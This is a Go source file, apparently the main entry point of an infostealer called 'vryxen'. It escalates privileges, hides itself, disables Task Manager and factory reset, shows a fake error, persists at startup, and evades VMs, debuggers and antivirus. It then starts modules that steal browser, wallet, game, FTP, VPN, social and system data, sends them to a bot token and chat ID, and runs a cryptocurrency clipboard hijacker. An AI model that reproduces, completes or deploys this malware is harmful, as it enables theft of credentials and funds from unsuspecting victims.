package main

import (
	"github.com/unf6/vryxen/internal/antidebug"
	"github.com/unf6/vryxen/internal/antivm"
	"github.com/unf6/vryxen/internal/antivirus"
	"github.com/unf6/vryxen/internal/fakerr"
	"github.com/unf6/vryxen/internal/hc"
	"github.com/unf6/vryxen/pkg/utils/startup"
	"github.com/unf6/vryxen/internal/uac"
	"github.com/unf6/vryxen/pkg/utils/common"
	"github.com/unf6/vryxen/pkg/utils/processkill"
        "github.com/unf6/vryxen/internal/fr"
	"github.com/unf6/vryxen/internal/taskmanager"


	
	"github.com/unf6/vryxen/internal/core/socials"
	"github.com/unf6/vryxen/internal/core/cryptowallets"
	"github.com/unf6/vryxen/internal/core/ftps"
	"github.com/unf6/vryxen/internal/core/games"
	"github.com/unf6/vryxen/internal/core/system"
	"github.com/unf6/vryxen/internal/core/browsers"
	"github.com/unf6/vryxen/internal/core/clipper"
	"github.com/unf6/vryxen/internal/core/commonfiles"
	"github.com/unf6/vryxen/internal/core/vpn"
)

func main() {
	CONFIG := map[string]interface{}{
		"botToken": "",
		"chatId": "",
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if common.IsAlreadyRunning() {
		return
	}

	Uac.Run()
	processkill.Run()

	HideConsole.Hide()
	common.HideSelf()
	FactoryReset.Disable()
	TaskManager.Disable()

	
	if !common.IsInStartupPath() {
		go FakeError.Show()
		go startup.Run()
	}

	AntiVMAnalysis.Check()
	go antidebug.Run()
	go antivirus.Run()

	actions := []func(string, string){
		system.Run,
		browsers.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
		ftps.Run,
		vpn.Run,
	}

	Socials.Run()
	for _, action := range actions {
		go action(CONFIG["botToken"].(string), CONFIG["chatId"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
